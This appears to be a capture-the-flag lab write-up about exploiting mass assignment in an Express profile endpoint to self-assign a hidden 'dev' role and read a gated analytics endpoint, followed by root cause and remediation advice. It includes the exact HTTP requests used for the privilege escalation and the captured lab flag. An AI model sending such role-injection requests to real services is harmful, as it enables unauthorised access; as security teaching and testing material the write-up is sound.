---
title: Ottergram - Mass Assignment
tags:
  - bugforge
  - mass-assignment
  - broken-access-control
aliases:
  - "/bugforge/ottergram-mass-assign/"
  - "/BugForge/Ottergram---Mass-Assignment"
---

- Ottergram-6 hides the `dev` role as the gate on its analytics endpoint. `PUT /api/profile` binds the whole request body onto the user record, so any user can self-promote to `role: "dev"` and read it.
- Key lesson: when a hint names a group ("devs"), that group's name is the exact role string. `admin` and `developer` are both rejected - the check is `role === 'dev'`.

## Enumeration

- Tech stack: Express.js (`X-Powered-By: Express`), React SPA with exposed source maps, JWT (HS256) Bearer auth, SQLite backend.
- Source maps exposed the full client: `App.js`, `components/Admin.js`, `components/Profile.js`.
- Admin panel endpoints discovered:
  - `GET /api/admin`
  - `GET /api/admin/users?search=`
  - `GET /api/admin/posts?search=`
  - `GET /api/admin/comments`
  - `GET /api/admin/analytics`
  - `PUT /api/admin/users/:id`
  - `DELETE /api/admin/{users,posts,comments}/:id`
- Auth model: the JWT payload is `{"id":<n>,"username":"<u>","iat":...}` - **no `role` claim**. The role is resolved server-side from the database on every request, so JWT tampering is not the vector here.
- `components/Profile.js` sends only `full_name` and `bio` on `PUT /api/profile`. The server binds the entire body.

## Two Different Role Checks On One Prefix

The tell is the error string. Same `/api/admin` prefix, different middleware:

| Test | Input | Result | Meaning |
|------|-------|--------|---------|
| `GET /api/admin` | `role=dev` token | 403 `Admin access required` | checks `role === 'admin'` |
| `GET /api/admin/analytics` | `role=user` token | 403 `Access denied` | checks something else |
| `GET /api/admin/analytics` | no token | 401 `Access token required` | auth enforced; authorisation is the gap |
| `GET /api/admin/analytics` | `role=dev` token | 200 + analytics + **flag** | the check is `role === 'dev'` |

## Exploitation

1. Register a normal account. It lands with `role: "user"`.
2. Mass-assign the role through the profile update endpoint, adding `role` to the body the UI never sends:

```
PUT /api/profile HTTP/1.1
Host: lab-1789725396055-tut5ww.labs-app.bugforge.io
Authorization: Bearer <user-role-jwt>
Content-Type: application/json

{"full_name":"Otter Lab","bio":"lab user","role":"dev"}
```

- Response: `200 OK` `{"message":"Profile updated successfully"}`

3. Read the gated endpoint with the same token:

```
GET /api/admin/analytics HTTP/1.1
Host: lab-1789725396055-tut5ww.labs-app.bugforge.io
Authorization: Bearer <user-role-jwt>
```

- Response: `200 OK` with `totalUsers`, `usersByRole` (now listing `dev`), `totalPosts`, `topPosts`, `activeUsers`, and `flag`.
- Three requests total. No admin credentials were involved.

## Flag

```
bug{Tny13zuG0gALRCE4MUrY6QMIBvAPqxp5}
```

## Security Takeaways

### Vulnerability
- Mass assignment leading to privilege escalation, then broken function-level access control on a privileged read endpoint.
- OWASP Top 10: A01 Broken Access Control
- CWE: CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object Attributes

### Root Cause
- `PUT /api/profile` binds the parsed request body directly onto the user record instead of an allowlist of `full_name` and `bio`. The client is trusted to send only the fields the form displays.
- `GET /api/admin/analytics` authorises against a hidden `dev` role that no user-facing flow can legitimately reach. The role string is the exact short form named in the hint, not `admin` and not `developer`.

### Remediation
- Allowlist assignable fields server-side (`full_name`, `bio`) and reject or ignore everything else. Never spread `req.body` into a database update.
- Treat `role` as a server-controlled attribute. Role changes belong on an admin-only route with its own authorisation and audit trail.
- Define the role model explicitly and enumerate it in authorisation middleware rather than comparing against scattered string literals, so a role cannot be introduced by a code path that no policy covers.
- Add a test asserting that arbitrary extra fields on `PUT /api/profile` do not persist.

### Key Lesson
- When a hint names a group, try the exact short form as a role value. `developer` returned 403; `dev` returned the flag.
- Different error messages on endpoints sharing a prefix mean different middleware, which means a role check worth enumerating against.
- The server accepts any string a client sends - UI dropdown values are not the valid input set.
- Lab flags are per-instance. A previously captured flag for the same challenge did not match this build; always reproduce live.
